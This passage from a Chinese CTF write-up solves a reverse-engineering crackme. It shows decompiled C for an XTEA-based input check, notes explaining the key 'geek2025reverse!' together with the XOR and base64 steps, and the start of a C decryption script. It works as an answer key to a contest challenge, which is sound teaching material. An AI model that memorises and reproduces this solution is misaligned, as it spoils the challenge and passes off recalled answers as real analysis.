</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">32</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="mi">13</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">              <span class="n">v5</span> <span class="o">=</span> <span class="n">v7</span> <span class="o">&lt;</span> <span class="n">v9</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">v7</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">a1</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">encrypted_len</span> <span class="o">=</span> <span class="nf">enc</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="n">v12</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encrypted_len</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">enc</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp-140h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [xsp+14h] [xbp-13Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">m</span><span class="p">;</span> <span class="c1">// [xsp+18h] [xbp-138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v11</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [xsp+38h] [xbp-118h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">a2</span> <span class="o">%</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">+</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">v4</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">8</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">m</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="n">m</span><span class="p">)</span> <span class="o">=</span> <span class="n">v11</span><span class="p">[</span><span class="n">k</span> <span class="o">+</span> <span class="n">m</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">enc_block</span><span class="p">(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">k</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">enc_block</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">result</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+4h] [xbp-3Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [xsp+4h] [xbp-3Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [xsp+8h] [xbp-38h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp-30h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [xsp+14h] [xbp-2Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="n">v7</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [xsp+28h] [xbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">_byteswap_ulong</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">_byteswap_ulong</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">+=</span> <span class="p">(((</span><span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="n">v5</span><span class="p">))</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v7</span><span class="p">[</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">-=</span> <span class="mi">1640531527</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">+=</span> <span class="p">(((</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="n">v6</span><span class="p">))</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v7</span><span class="p">[(</span><span class="n">v4</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">result</span> <span class="o">=</span> <span class="nf">HIBYTE</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">BYTE2</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="nf">BYTE1</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="nf">HIBYTE</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="nf">BYTE2</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">=</span> <span class="nf">BYTE1</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先main里面的scanf并不是真的scanf,里面有套娃，先在这个假的scanf里去除一些特殊字符后到enc里，
然后分块,并从&amp;a处得到key</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">geek2025reverse!
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后enc_block里分别加密，是一个轮数为32的XTEA
最后将加密得到的密文与每位分别与0x5a异或，然后base64后与&amp;unk_100003EF1处保存的密文比较</p>
<h4 id="exp-8">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dec_block</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">block</span><span class="p">,</span> <span class="k">const</span> <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">v4</span> <span class="o">=</span> <span class="mh">0xC6EF3720</span><span class="p">;</span> <span class="c1">// 32 * 0x9E3779B9的补码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">block</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">block</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">-=</span> <span class="p">(((</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">key</span><span class="p">[(</span><span class="n">v4</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v4</span> <span class="o">+=</span> <span class="mh">0x61C88647</span><span class="p">;</span> <span class="c1">// 0x9E3779B9的补码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">v6</span> <span class="o">-=</span> <span class="p">(((</span><span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">block</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
